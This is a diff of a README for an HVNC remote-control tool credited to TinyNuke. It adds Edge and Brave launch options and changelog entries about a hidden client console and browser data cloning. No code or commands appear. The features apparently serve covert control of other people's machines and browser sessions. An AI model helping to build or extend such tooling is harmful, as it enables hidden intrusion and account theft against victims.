@@ -8,6 +8,8 @@ Credits to Tinynuke: https://github.com/rossja/TinyNuke
 - Open "Run"
 - Start Powershell
 - Start Chrome
+- Start Edge
+- Start Brave
 - Start Firefox
 - Start Internet Explorer
 
@@ -20,7 +22,10 @@ Credits to Tinynuke: https://github.com/rossja/TinyNuke
 
 - Fixed Browser Data Clone
 - Added "Start Powershell" Option
-- Made Client's Console Hidden
+- Made Client Console Hidden
+- Added "Start Edge" Option
+- Added "Start Brave" Option
+- Adjusted Window Size for "Start Powershell"
 
 # Demo of HVNC Window:
 View Demo Video: https://vimeo.com/597459719
